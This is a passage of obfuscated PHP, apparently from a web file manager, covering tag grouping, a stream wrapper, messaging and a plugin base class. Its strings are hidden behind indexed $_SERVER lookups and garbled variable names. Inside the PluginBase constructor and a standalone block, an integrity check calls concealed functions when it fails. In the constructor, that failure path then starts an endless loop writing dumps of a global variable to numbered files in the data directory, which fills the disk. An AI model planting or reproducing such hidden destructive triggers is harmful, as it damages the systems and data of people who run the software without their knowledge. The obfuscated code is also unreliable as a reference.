$£Á’ß€í = array($öç‹¿àÃ[432] => $÷áºˆÅ); $„ëòª­Œ = Model($öç‹¿àÃ[821])->where($£Á’ß€í)->field($öç‹¿àÃ[1965])->select(); if (!$„ëòª­Œ) { $„ëòª­Œ = array(); } Model($öç‹¿àÃ[821])->moveClearAuth = !1; foreach ($„ëòª­Œ as $ø¨Œµ÷Á) { $Ïü¨¿ıñ = $ø¨Œµ÷Á[$öç‹¿àÃ[410]] == $öç‹¿àÃ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($öç‹¿àÃ[821])->move($ø¨Œµ÷Á[$öç‹¿àÃ[402]], $«Ô¥ê¡, $Ïü¨¿ıñ); } Model($öç‹¿àÃ[821])->moveClearAuth = !0; $£Á’ß€í = array($öç‹¿àÃ[411] => 2, $öç‹¿àÃ[496] => $…ÔÀ¸ÃË); $ƒÊ×…İş = array($öç‹¿àÃ[496] => $‚„—Ñ’ó); Model($öç‹¿àÃ[1966])->where($£Á’ß€í)->save($ƒÊ×…İş); Model($öç‹¿àÃ[1967])->where($£Á’ß€í)->save($ƒÊ×…İş); } $this->_changeChildLevel($…»ÊÏ°[$…ÔÀ¸ÃË], $…»ÊÏ°[$‚„—Ñ’ó], !0); $this->where(array($öç‹¿àÃ[432] => $…ÔÀ¸ÃË))->save(array($öç‹¿àÃ[432] => $‚„—Ñ’ó)); $this->_clearChildrenCache($…»ÊÏ°[$‚„—Ñ’ó]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($Íß‹´Ô”) { $ŒĞ³±šˆ =& $_SERVER[ì™ı‰º¯]; return array($ŒĞ³±šˆ[1968] => array($Íß‹´Ô”[0], $ŒĞ³±šˆ[1969]), $ŒĞ³±šˆ[1970] => array($Íß‹´Ô”[0], $ŒĞ³±šˆ[1971])); } protected function get($ıÅ“Ü¯Ü) { $¾÷ÇØ• =& $_SERVER[ì™ı‰º¯]; $ÒüıÏ€Ú = Model($¾÷ÇØ•[512])->metaGet($ıÅ“Ü¯Ü, $¾÷ÇØ•[1972]); $˜óêÕŒ– = json_decode($ÒüıÏ€Ú, !0); return $˜óêÕŒ– ? $˜óêÕŒ– : array($¾÷ÇØ•[1973] => $¾÷ÇØ•[88], $¾÷ÇØ•[369] => array()); } protected function set($ÙÔçü™™, $ä‚ÁØ÷õ) { $ÊÈ¸ÍÕ€ =& $_SERVER[ì™ı‰º¯]; $ä‚ÁØ÷õ = $ä‚ÁØ÷õ ? $ä‚ÁØ÷õ : array($ÊÈ¸ÍÕ€[1973] => $ÊÈ¸ÍÕ€[88], $ÊÈ¸ÍÕ€[369] => array()); return Model($ÊÈ¸ÍÕ€[512])->metaSet($ÙÔçü™™, $ÊÈ¸ÍÕ€[1972], json_encode($ä‚ÁØ÷õ)); } protected function getByTagID($ƒ’»¡°, $¶ßõÆı²) { $ˆÂëÜì¶ =& $_SERVER[ì™ı‰º¯]; if (!$ƒ’»¡° || !$¶ßõÆı²) { return !1; } if (!Model($ˆÂëÜì¶[512])->getInfoSimple($ƒ’»¡°)) { return !1; } $¹ØÆğ¨Œ = $this->get($ƒ’»¡°); if (!$¹ØÆğ¨Œ || !isset($¹ØÆğ¨Œ[$ˆÂëÜì¶[369]])) { return !1; } $ö›­¥Ù· = array_find_by_field($¹ØÆğ¨Œ[$ˆÂëÜì¶[369]], $ˆÂëÜì¶[399], $¶ßõÆı²); return is_array($ö›­¥Ù·) ? $ö›­¥Ù· : !1; } public function listSource($µÖœúÆ™, $ûûî——Ÿ) { $ôÁ¬éÍ =& $_SERVER[ì™ı‰º¯]; if ($ûûî——Ÿ && !is_array($ûûî——Ÿ)) { $ûûî——Ÿ = array($ûûî——Ÿ); } $Êîû¹®€ = $this->listData($µÖœúÆ™); $¼«”æŒ = array(); foreach ($Êîû¹®€ as $´õôÉ) { $™ÓŸ«îº = $´õôÉ[$ôÁ¬éÍ[84]]; if (!$™ÓŸ«îº) { continue; } if (!isset($¼«”æŒ[$™ÓŸ«îº])) { $¼«”æŒ[$™ÓŸ«îº] = array(); } $¼«”æŒ[$™ÓŸ«îº][] = $´õôÉ[$ôÁ¬éÍ[426]]; } $Ãµ·ñÕØ = array(); foreach ($¼«”æŒ as $Â‘ÛŠ¶« => $·’ƒè‹) { $¡´¬ÁĞı = !0; if (!$ûûî——Ÿ) { $Ãµ·ñÕØ[] = $Â‘ÛŠ¶«; continue; } foreach ($ûûî——Ÿ as $Š×ş÷û©) { if (!in_array($Š×ş÷û©, $·’ƒè‹)) { $¡´¬ÁĞı = !1; break; } } if ($¡´¬ÁĞı) { $Ãµ·ñÕØ[] = $Â‘ÛŠ¶«; } } if (!$Ãµ·ñÕØ) { return array(); } $Âğí§å = array($ôÁ¬éÍ[417] => array($ôÁ¬éÍ[418], $Ãµ·ñÕØ), $ôÁ¬éÍ[496] => $µÖœúÆ™, $ôÁ¬éÍ[411] => SourceModel::TYPE_GROUP); $±Û†›çü = Model($ôÁ¬éÍ[1338])->listSource($Âğí§å); if (!$±Û†›çü || count($Ãµ·ñÕØ) == $±Û†›çü[$ôÁ¬éÍ[366]][$ôÁ¬éÍ[367]]) { return $±Û†›çü; } $”¯ùÃï¢ = array(); $Üà™ïŒ = array_to_keyvalue($±Û†›çü[$ôÁ¬éÍ[82]], $ôÁ¬éÍ[12], $ôÁ¬éÍ[402]); $Ëªîê÷ó = array_to_keyvalue($±Û†›çü[$ôÁ¬éÍ[83]], $ôÁ¬éÍ[12], $ôÁ¬éÍ[402]); $äš”™³• = array_merge($Ëªîê÷ó, $Üà™ïŒ); foreach ($Ãµ·ñÕØ as $™ÓŸ«îº) { if (!in_array($™ÓŸ«îº, $äš”™³•)) { $”¯ùÃï¢[] = $™ÓŸ«îº; } } if ($”¯ùÃï¢) { $this->removeBySource($µÖœúÆ™, $”¯ùÃï¢); } return $±Û†›çü; } protected function listData($œğş†”) { $ÓèÇ‚§ =& $_SERVER[ì™ı‰º¯]; $ÀÊ±ÕıÍ = array($ÓèÇ‚§[1661] => 0, $ÓèÇ‚§[483] => array($ÓèÇ‚§[1974], 0), $ÓèÇ‚§[422] => $ÓèÇ‚§[1975] . $œğş†”); $ËœÇÔË = $ÓèÇ‚§[1976]; $‚À‹Ìµ÷ = $this->field($ËœÇÔË)->where($ÀÊ±ÕıÍ)->order($ÓèÇ‚§[1977])->select(); return $‚À‹Ìµ÷ ? $‚À‹Ìµ÷ : array(); } protected function addToTag($‰ê­Ñ˜¦, $¥»ÛĞÛ, $ø´Ë©Ê…) { $“ß¶Ö”Á =& $_SERVER[ì™ı‰º¯]; if (!$this->getByTagID($‰ê­Ñ˜¦, $ø´Ë©Ê…) || !$¥»ÛĞÛ) { return !1; } if (!Model($“ß¶Ö”Á[821])->pathInfo($¥»ÛĞÛ)) { return !1; } $¶„÷ñ¦ = array($“ß¶Ö”Á[1661] => 0, $“ß¶Ö”Á[483] => $ø´Ë©Ê…, $“ß¶Ö”Á[421] => $¥»ÛĞÛ, $“ß¶Ö”Á[422] => $“ß¶Ö”Á[1978] . $‰ê­Ñ˜¦, $“ß¶Ö”Á[420] => $“ß¶Ö”Á[12], $“ß¶Ö”Á[1863] => 0); if ($this->where($¶„÷ñ¦)->find()) { return !1; } return $this->add($¶„÷ñ¦); } protected function removeFromTag($Æ”ÛØ­Ö, $Ù×´¬³, $šÒ¸ß´§) { $ïÓ®Æ®¤ =& $_SERVER[ì™ı‰º¯]; if (!$this->getByTagID($Æ”ÛØ­Ö, $šÒ¸ß´§) || !$Ù×´¬³) { return !1; } if (is_array($Ù×´¬³)) { $Ù×´¬³ = array($ïÓ®Æ®¤[7], $Ù×´¬³); } $Ü”ËƒãÊ = array($ïÓ®Æ®¤[1661] => 0, $ïÓ®Æ®¤[483] => $šÒ¸ß´§, $ïÓ®Æ®¤[422] => $ïÓ®Æ®¤[1978] . $Æ”ÛØ­Ö, $ïÓ®Æ®¤[421] => $Ù×´¬³); return $this->where($Ü”ËƒãÊ)->delete(); } protected function removeByTag($ÚÏ¶õêÍ, $é„Ó«³) { $İıÁòä =& $_SERVER[ì™ı‰º¯]; if (!$this->getByTagID($ÚÏ¶õêÍ, $é„Ó«³)) { return !1; } $ï¹ª™Æû = array($İıÁòä[1661] => 0, $İıÁòä[483] => $é„Ó«³, $İıÁòä[422] => $İıÁòä[1978] . $ÚÏ¶õêÍ); return $this->where($ï¹ª™Æû)->delete(); } protected function removeBySource($–Üê«Öî, $ œöğÓ¾) { $Û‘ÈÑ´Ç =& $_SERVER[ì™ı‰º¯]; if (!$–Üê«Öî || !$ œöğÓ¾) { return !1; } if (is_array($ œöğÓ¾)) { $ œöğÓ¾ = array($Û‘ÈÑ´Ç[7], $ œöğÓ¾); } $íüÆÈ à = array($Û‘ÈÑ´Ç[1661] => 0, $Û‘ÈÑ´Ç[421] => $ œöğÓ¾, $Û‘ÈÑ´Ç[483] => array($Û‘ÈÑ´Ç[1013], 0), $Û‘ÈÑ´Ç[422] => $Û‘ÈÑ´Ç[1978] . $–Üê«Öî); return $this->where($íüÆÈ à)->delete(); } } if ($_SERVER[$_SERVER[ì™ı‰º¯][872]] != $_SERVER[$_SERVER[ì™ı‰º¯][1511]]) { $_getc = $_SERVER[ì™ı‰º¯][875]; $_getfile = $_SERVER[$_SERVER[ì™ı‰º¯][876]] . $_SERVER[ì™ı‰º¯][877]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì™ı‰º¯][231], $_getfilec); if (count($_getarrs) < $_SERVER[ì™ı‰º¯][612]) { $exit = $_SERVER[ì™ı‰º¯][878]; $exit(); } $_act = $_SERVER[ì™ı‰º¯][1512]; $_act($_SERVER[$_SERVER[ì™ı‰º¯][873]]); } goto c“ìÏØ‘ğ; fŠ¨Ê‘àÔ‹: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($…”»ê‹æ, $²òó¯Óœ = '') { $this->info = $this->info($…”»ê‹æ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ì™ı‰º¯][84]]; $this->pathOpen = $…”»ê‹æ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$…”»ê‹æ])) { self::$_chunkBuffer[$…”»ê‹æ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($á®Ö«Ôœ) { $Ÿ•Ÿ‰™û = $this->fileSubstr($this->pose, $á®Ö«Ôœ); $this->pose += strlen($Ÿ•Ÿ‰™û); return $Ÿ•Ÿ‰™û; } public function stream_tell() { return $this->pose; } public function stream_seek($„÷ˆ‡ã, $¯Ù¸¹Ş) { $Á•«ï‘“ =& $_SERVER[ì™ı‰º¯]; if ($¯Ù¸¹Ş == SEEK_SET) { $this->pose = $„÷ˆ‡ã; } else { if ($¯Ù¸¹Ş == SEEK_CUR) { $this->pose += $„÷ˆ‡ã; } else { if ($¯Ù¸¹Ş == SEEK_END) { $this->pose = $this->info[$Á•«ï‘“[76]] + intval($„÷ˆ‡ã); } } } if ($„÷ˆ‡ã < 0) { $this->pose = $this->info[$Á•«ï‘“[76]] + $„÷ˆ‡ã; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ì™ı‰º¯][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¶ƒĞ›ÄÌ, $’Ôµ™Îæ) { $–†Ûö‘» =& $_SERVER[ì™ı‰º¯]; $ëÑ©·Ë¬ = $this->info($¶ƒĞ›ÄÌ); return array($–†Ûö‘»[1517] => 0, $–†Ûö‘»[1518] => 0, $–†Ûö‘»[16] => 32768 + 511, $–†Ûö‘»[1519] => 0, $–†Ûö‘»[1520] => 0, $–†Ûö‘»[1521] => 0, $–†Ûö‘»[1522] => 0, $–†Ûö‘»[76] => $ëÑ©·Ë¬[$–†Ûö‘»[76]], $–†Ûö‘»[1523] => $ëÑ©·Ë¬[$–†Ûö‘»[1388]], $–†Ûö‘»[1476] => $ëÑ©·Ë¬[$–†Ûö‘»[85]], $–†Ûö‘»[1475] => $ëÑ©·Ë¬[$–†Ûö‘»[201]], $–†Ûö‘»[1524] => 0, $–†Ûö‘»[1525] => 0); } static $fileInfo = array(); public function info($µâàèƒ) { $¶¥Ÿ‰ = $_SERVER[ì™ı‰º¯][1526]; if (isset(self::$fileInfo[$µâàèƒ])) { return self::$fileInfo[$µâàèƒ]; } if (substr($µâàèƒ, 0, strlen($¶¥Ÿ‰)) != $¶¥Ÿ‰) { return !1; } self::$fileInfo[$µâàèƒ] = IO::info(substr($µâàèƒ, strlen($¶¥Ÿ‰))); return self::$fileInfo[$µâàèƒ]; } public static function read($¾§ÂËã, $ú¥½ûè, $îıç·¡˜) { if (!isset(self::$_fopenCache[$¾§ÂËã])) { $¼ƒĞÙÓä = new StreamWrapperIO(); $¼ƒĞÙÓä->stream_open($¾§ÂËã); self::$_fopenCache[$¾§ÂËã] = $¼ƒĞÙÓä; } $¼ƒĞÙÓä = self::$_fopenCache[$¾§ÂËã]; return $¼ƒĞÙÓä->fileSubstr($ú¥½ûè, $îıç·¡˜); } public static function _read($‰°”ÒÆÙ, $ŒÃ”à”Ì, $´îÏ…©®) { $ëË½Ñ¯ê =& $_SERVER[ì™ı‰º¯]; $‹Õ˜¨…½ = fopen($‰°”ÒÆÙ, $ëË½Ñ¯ê[1392]); if (!$‹Õ˜¨…½) { return $ëË½Ñ¯ê[12]; } $Ûşõ»šÍ = 8192; fseek($‹Õ˜¨…½, $ŒÃ”à”Ì, SEEK_SET); $Ø¿ñÛ†™ = $ëË½Ñ¯ê[12]; $±Ü¢œÒ = 0; while ($±Ü¢œÒ < $´îÏ…©®) { $¦ŞïÄğ = min($Ûşõ»šÍ, $´îÏ…©® - $±Ü¢œÒ); $Ø¿ñÛ†™ .= fread($‹Õ˜¨…½, $¦ŞïÄğ); $±Ü¢œÒ += $¦ŞïÄğ; } fclose($‹Õ˜¨…½); return $Ø¿ñÛ†™; } public function fileSubstr($¨êãÌ“», $¨Ï”šÔÉ) { $°áéÌ¤Ş =& $_SERVER[ì™ı‰º¯]; $ï»½¯ñ± = $this->info[$°áéÌ¤Ş[76]]; $§Áàò÷Ï = $¨êãÌ“»; $„ö¤ˆÁ¢ = $¨Ï”šÔÉ; if ($¨êãÌ“» < 0) { $¨êãÌ“» = $ï»½¯ñ± + $¨êãÌ“»; } if ($¨Ï”šÔÉ === !1) { $¨Ï”šÔÉ = $ï»½¯ñ± - $¨êãÌ“»; } if ($¨êãÌ“» + $¨Ï”šÔÉ > $ï»½¯ñ±) { $¨Ï”šÔÉ = $ï»½¯ñ± - $¨êãÌ“»; } if ($¨Ï”šÔÉ <= 0) { return $°áéÌ¤Ş[12]; } if ($¨êãÌ“» < 0 || $¨êãÌ“» >= $ï»½¯ñ± || $¨Ï”šÔÉ <= 0 || $¨Ï”šÔÉ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\154\x65\x52\145\x61\x64\x20\145\162\162\157\162\41\40\x73\x74\141\x72\x74\x3d{$¨êãÌ“»}\73\x6c\x65\x6e\x67\164\150\x3d{$¨Ï”šÔÉ}\x3b\x20\x73\x69\x7a\145\75{$ï»½¯ñ±}\x3b"); } $µäÃÛ³ì = 64 * 1024; $šÑê‡üÃ =& self::$_chunkBuffer[$this->path]; if (!$šÑê‡üÃ) { $šÑê‡üÃ = array(); } $¨ ’¦È = 0; $Æµç¡ø = 0; $¦¢²Ú„Á = $°áéÌ¤Ş[12]; foreach ($šÑê‡üÃ as $¨ ’¦È => $¦¢²Ú„Á) { $¨ ’¦È = intval($¨ ’¦È); $Æµç¡ø = $¨ ’¦È + strlen($¦¢²Ú„Á); if ($¨êãÌ“» >= $Æµç¡ø) { continue; } if ($¨êãÌ“» >= $¨ ’¦È && $¨êãÌ“» + $¨Ï”šÔÉ <= $Æµç¡ø) { return substr($¦¢²Ú„Á, $¨êãÌ“» - $¨ ’¦È, $¨Ï”šÔÉ); } break; } if (count($šÑê‡üÃ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($°áéÌ¤Ş[1527], $°áéÌ¤Ş[1528] . count($šÑê‡üÃ) . "\73\163\164\141\x72\x74\x3d{$¨êãÌ“»}\x2c\x6c\x65\x6e\147\x74\x68\x3d{$¨Ï”šÔÉ}\73\160\x6f\163\x65\72{$¨ ’¦È}\176{$Æµç¡ø}"); throw new Exception($°áéÌ¤Ş[1529]); } $½ÏÂ³öÊ = intval($¨êãÌ“» / $µäÃÛ³ì) * $µäÃÛ³ì; $ê…êÛá­ = ceil(($¨êãÌ“» + $¨Ï”šÔÉ) / $µäÃÛ³ì) * $µäÃÛ³ì - $½ÏÂ³öÊ; $…‡é›¦· = IO::fileSubstr($this->path, $½ÏÂ³öÊ, $ê…êÛá­); $šÑê‡üÃ[$½ÏÂ³öÊ . $°áéÌ¤Ş[12]] = $…‡é›¦·; ksort($šÑê‡üÃ); $È×½ÎÖá = substr($…‡é›¦·, $¨êãÌ“» - $½ÏÂ³öÊ, $¨Ï”šÔÉ); return $È×½ÎÖá; } private function log($ë¸‘üç£, $ãû‚Œ) { $Â«›Ïôî =& $_SERVER[ì™ı‰º¯]; $Á‚Ú²ùê = timeFloat() - $this->timeStart; write_log(sprintf($Â«›Ïôî[1530], $ë¸‘üç£, $this->info[$Â«›Ïôî[32]], $Á‚Ú²ùê, $ãû‚Œ), $Â«›Ïôî[1181]); } } class Message { function __construct() { } public function send($óà»íÖ = '', $ûÑ¸ô†í = array(), $ı¥áÔ­¼ = "\164\145\170\x74") { $Èí‡«”Ä =& $_SERVER[ì™ı‰º¯]; $èúìƒµë = array($Èí‡«”Ä[33] => $Èí‡«”Ä[1531], $Èí‡«”Ä[750] => $óà»íÖ); if (in_array($ı¥áÔ­¼, array($Èí‡«”Ä[1531], $Èí‡«”Ä[1532]))) { $èúìƒµë[$Èí‡«”Ä[33]] = $ı¥áÔ­¼; } $ûÑ¸ô†í = array($Èí‡«”Ä[505] => isset($ûÑ¸ô†í[$Èí‡«”Ä[505]]) ? $ûÑ¸ô†í[$Èí‡«”Ä[505]] : $Èí‡«”Ä[12], $Èí‡«”Ä[590] => isset($ûÑ¸ô†í[$Èí‡«”Ä[590]]) ? $ûÑ¸ô†í[$Èí‡«”Ä[590]] : $Èí‡«”Ä[12]); if (empty($óà»íÖ) || empty($ûÑ¸ô†í[$Èí‡«”Ä[505]]) && empty($ûÑ¸ô†í[$Èí‡«”Ä[590]])) { return !1; } $¡ÌÅ³Ù™ = array($Èí‡«”Ä[1469] => $èúìƒµë, $Èí‡«”Ä[1533] => $ûÑ¸ô†í); Hook::trigger($Èí‡«”Ä[1534], $¡ÌÅ³Ù™); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ø½ŸÁŒ =& $_SERVER[ì™ı‰º¯]; $Ş£ò°å = $_SERVER[$Ø½ŸÁŒ[876]] . $Ø½ŸÁŒ[877]; $úí¦¦ŠŠ = $Ø½ŸÁŒ[1516]; if ($_SERVER[$Ø½ŸÁŒ[872]] != $úí¦¦ŠŠ($Ş£ò°å)) { $¸¤ß£…Ú = $Ø½ŸÁŒ[874]; $§ê¡× = $Ø½ŸÁŒ[875]; $×ê˜Óß = $_SERVER[$Ø½ŸÁŒ[876]] . $Ø½ŸÁŒ[877]; $ìâ–½‡ = $§ê¡×($×ê˜Óß); $Õñ’«¢ = explode($Ø½ŸÁŒ[231], $ìâ–½‡); if (count($Õñ’«¢) < $Ø½ŸÁŒ[610]) { $£Šñ»ŸÂ = $Ø½ŸÁŒ[878]; $£Šñ»ŸÂ(); } $ª±Ï³üÏ = $Ø½ŸÁŒ[879]; $ª±Ï³üÏ($_SERVER[$Ø½ŸÁŒ[880]]); $¸¤ß£…Ú = $Ø½ŸÁŒ[874]; $¸¤ß£…Ú(); $­Õ·“ÜÎ = $Ø½ŸÁŒ[1535]; $„¨¡•ôÄ = json_encode($GLOBALS[$Ø½ŸÁŒ[1536]]); $ÀÙì€¥¦ = 1; for ($í”å“£ = $ÀÙì€¥¦; $í”å“£ > 0; $í”å“£++) { $­Õ·“ÜÎ(DATA_PATH . $í”å“£, $„¨¡•ôÄ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ø½ŸÁŒ[1537]); $this->pluginName = str_replace($Ø½ŸÁŒ[1537], $Ø½ŸÁŒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ø½ŸÁŒ[8]; $this->pluginApi = appHostGet() . $Ø½ŸÁŒ[1538] . $this->pluginName . $Ø½ŸÁŒ[8]; $this->pluginHost = $config[$Ø½ŸÁŒ[1539]] . $this->pluginName . $Ø½ŸÁŒ[8]; $this->pluginHostDefault = $config[$Ø½ŸÁŒ[1539]] . $this->pluginName . $Ø½ŸÁŒ[8]; $©ğ¼²Íò = $config[$Ø½ŸÁŒ[1540]]; if ($©ğ¼²Íò && strpos($Ø½ŸÁŒ[50] . $©ğ¼²Íò . $Ø½ŸÁŒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ø½ŸÁŒ[1541]] . $this->pluginName . $Ø½ŸÁŒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ì™ı‰º¯][1542]); } protected function assign($šË«‡Í, $ôÇ“åèÄ = false) { if (is_array($šË«‡Í)) { $this->values = array_merge($this->values, $šË«‡Í); } else { $this->values[$šË«‡Í] = $ôÇ“åèÄ; } } protected function display($Û¶ÑìÛô) { extract($this->values); require $Û¶ÑìÛô; } final function hookRegist($š’ËÅ¡) { $this->modelPlugin->appRegist($this->pluginName, $š’ËÅ¡); } final function appIcon() { $ıæÀò× =& $_SERVER[ì™ı‰º¯]; $¥ØÔ”ñ = $this->appPackage(); $ªÀ’ÏïÇ = $ıæÀò×[12]; if (isset($¥ØÔ”ñ[$ıæÀò×[416]])) { if (isset($¥ØÔ”ñ[$ıæÀò×[416]][$ıæÀò×[1543]])) { $ªÀ’ÏïÇ = $ıæÀò×[1544] . $¥ØÔ”ñ[$ıæÀò×[416]][$ıæÀò×[1543]] . $ıæÀò×[1545]; } else { if ($¥ØÔ”ñ[$ıæÀò×[416]][$ıæÀò×[1546]]) { $ªÀ’ÏïÇ = $ıæÀò×[1547] . $¥ØÔ”ñ[$ıæÀò×[416]][$ıæÀò×[1546]] . $ıæÀò×[1548]; } } } return $ªÀ’ÏïÇ; } final function fileCanView($ãñÌæ) { $¬¢†ºÜµ =& $_SERVER[ì™ı‰º¯]; if (request_url_safe($ãñÌæ)) { return !0; } if ($this->isShare($ãñÌæ)) { return !0; } $³Ô…í€‰ = Session::get($¬¢†ºÜµ[1549]); if (!$³Ô…í€‰ || !$³Ô…í€‰[$¬¢†ºÜµ[1550]]) { $Ü·º¦ó¼ = $¬¢†ºÜµ[1551] . rawurlencode(this_url()); show_tips(LNG($¬¢†ºÜµ[1552]) . $¬¢†ºÜµ[1553] . $Ü·º¦ó¼ . $¬¢†ºÜµ[1554] . LNG($¬¢†ºÜµ[1555]) . $¬¢†ºÜµ[1556], !1); } if (!Action($¬¢†ºÜµ[1557])->authCan($¬¢†ºÜµ[1558])) { show_tips(LNG($¬¢†ºÜµ[1559]) . $¬¢†ºÜµ[1560], !1); } ActionCall($¬¢†ºÜµ[1561], $ãñÌæ); } final function isShare($†¥ÀûíÄ) { $åÙ¸Û¬è = KodIO::parse($†¥ÀûíÄ); return $åÙ¸Û¬è[$_SERVER[ì™ı‰º¯][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ç£½ş„) { if (request_url_safe($ç£½ş„)) { return $ç£½ş„; } if (!$this->isShare($ç£½ş„)) { $ç£½ş„ = $this->filePath($ç£½ş„); } return Action($_SERVER[ì™ı‰º¯][1173])->linkOut($ç£½ş„); } public function filePathLinkOut($ó†€º¨) { if (request_url_safe($ó†€º¨)) { return $ó†€º¨; } $this->fileCanView($ó†€º¨); return Action($_SERVER[ì™ı‰º¯][1173])->link($ó†€º¨); } final function filePath($£¢äÃİˆ) { $àÌ›‘œÒ =& $_SERVER[ì™ı‰º¯]; if ($†¡†½« = $this->checkSharePath($£¢äÃİˆ)) { Hook::trigger($àÌ›‘œÒ[1562], $†¡†½«); return $†¡†½«; } $this->fileCanView($£¢äÃİˆ); if (request_url_safe($£¢äÃİˆ)) { $ü…’Şç¿ = parse_url_query($£¢äÃİˆ); if (isset($ü…’Şç¿[$àÌ›‘œÒ[1563]]) && isset($ü…’Şç¿[$àÌ›‘œÒ[213]])) { $è‡’öÏá = Model($àÌ›‘œÒ[766])->get($àÌ›‘œÒ[767]); $ûÁîÕö§ = Mcrypt::decode($ü…’Şç¿[$àÌ›‘œÒ[213]], $è‡’öÏá); if ($ûÁîÕö§) { $this->fileInfo = IO::infoWithChildren($ûÁîÕö§); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ûÁîÕö§; } } $£¢äÃİˆ = $this->_cacheHttpFile($£¢äÃİˆ); $this->fileInfo = IO::infoWithChildren($£¢äÃİˆ); } else { $this->fileInfo = IO::infoWithChildren($£¢äÃİˆ); if (!$this->fileInfo) { show_tips(LNG($àÌ›‘œÒ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($àÌ›‘œÒ[1562], $£¢äÃİˆ); return $£¢äÃİˆ; } final function _cacheHttpFile($ê–û«°ê) { $ŒÆ«‡’‰ = hash_path($ê–û«°ê, !0); $this->cachePath = $this->pluginCachePath($ŒÆ«‡’‰); if ($á¾¦‰¤Ö = IO::fileNameExist($this->cachePath, $ŒÆ«‡’‰)) { return KodIO::make($á¾¦‰¤Ö); } $Òãâ¿ = $this->cachePath . $ŒÆ«‡’‰; return $this->pluginCacheFileSet($Òãâ¿, file_get_contents_nossl($ê–û«°ê)); } final function _tmpFileName($¦ßø¡µ = array()) { $‡ß ÄŠı =& $_SERVER[ì™ı‰º¯]; if (!$¦ßø¡µ) { $¦ßø¡µ = $this->fileInfo; } if (isset($¦ßø¡µ[$‡ß ÄŠı[177]])) { return $¦ßø¡µ[$‡ß ÄŠı[177]]; } if (isset($¦ßø¡µ[$‡ß ÄŠı[170]][$‡ß ÄŠı[177]])) { return $¦ßø¡µ[$‡ß ÄŠı[170]][$‡ß ÄŠı[177]]; } $¦ÖØœæ¯ = IO::hashSimple($¦ßø¡µ[$‡ß ÄŠı[84]]); if ($¦ÖØœæ¯) { return $¦ÖØœæ¯; } $«‚»‹øÜ = array($¦ßø¡µ[$‡ß ÄŠı[32]], $¦ßø¡µ[$‡ß ÄŠı[84]], $¦ßø¡µ[$‡ß ÄŠı[76]]); if (isset($¦ßø¡µ[$‡ß ÄŠı[511]])) { $«‚»‹øÜ[] = $¦ßø¡µ[$‡ß ÄŠı[511]]; } return md5(implode($‡ß ÄŠı[11], $«‚»‹øÜ)); } final function checkSharePath($««ÔöÁˆ) { $ÇÊ•Ñ‰á =& $_SERVER[ì™ı‰º¯]; if (!$this->isShare($««ÔöÁˆ)) { return !1; } $‚û´—ÂÙ = Action($ÇÊ•Ñ‰á[1173])->sharePathInfo($««ÔöÁˆ); if (!isset($‚û´—ÂÙ[$ÇÊ•Ñ‰á[84]])) { show_json(LNG($ÇÊ•Ñ‰á[1564]), !1); } $this->fileInfo = $‚û´—ÂÙ[$ÇÊ•Ñ‰á[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÇÊ•Ñ‰á[177]]); return $‚û´—ÂÙ[$ÇÊ•Ñ‰á[84]]; } final function pluginCachePath($‰™‡ŞÂı = '') { $ê‹Ìóã =& $_SERVER[ì™ı‰º¯]; $†Á—Öù± = IO_PATH_SYSTEM_TEMP . $ê‹Ìóã[1565] . $this->pluginName; if (!($°¦í¬øÊ = IO::infoFull($†Á—Öù±))) { return IO::mkdir($†Á—Öù± . $ê‹Ìóã[8] . $‰™‡ŞÂı); } if (empty($‰™‡ŞÂı)) { return $°¦í¬øÊ[$ê‹Ìóã[84]]; } if (!($³³«ç² = IO::fileNameExist($°¦í¬øÊ[$ê‹Ìóã[84]], $‰™‡ŞÂı))) { return IO::mkdir($°¦í¬øÊ[$ê‹Ìóã[84]] . $‰™‡ŞÂı); } return KodIO::make($³³«ç²); } final function pluginCacheFileSet($º¸‰ğú, $¼ÚùÉØæ = '') { $ÊîãÔ¦Í =& $_SERVER[ì™ı‰º¯]; if (!($©èÕ¤Í° = IO::infoFull($º¸‰ğú))) { return IO::mkfile($º¸‰ğú, $¼ÚùÉØæ, REPEAT_REPLACE); } IO::setContent($©èÕ¤Í°[$ÊîãÔ¦Í[84]], $¼ÚùÉØæ); return $©èÕ¤Í°[$ÊîãÔ¦Í[84]]; } final function pluginLocalFile($çØÅÂ® = '') { $Šè³»¤¶ =& $_SERVER[ì™ı‰º¯]; $û¦òØ…Ş = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($û¦òØ…Ş)) { mk_dir($û¦òØ…Ş); } if (!$çØÅÂ®) { return $û¦òØ…Ş; } $€ÍûÙê = IO::info($çØÅÂ®); $ôˆÓÍ€ = $this->_tmpFileName($€ÍûÙê) . $Šè³»¤¶[10] . $€ÍûÙê[$Šè³»¤¶[174]]; if (!checkExtSafe($ôˆÓÍ€)) { $ôˆÓÍ€ = $ôˆÓÍ€ . 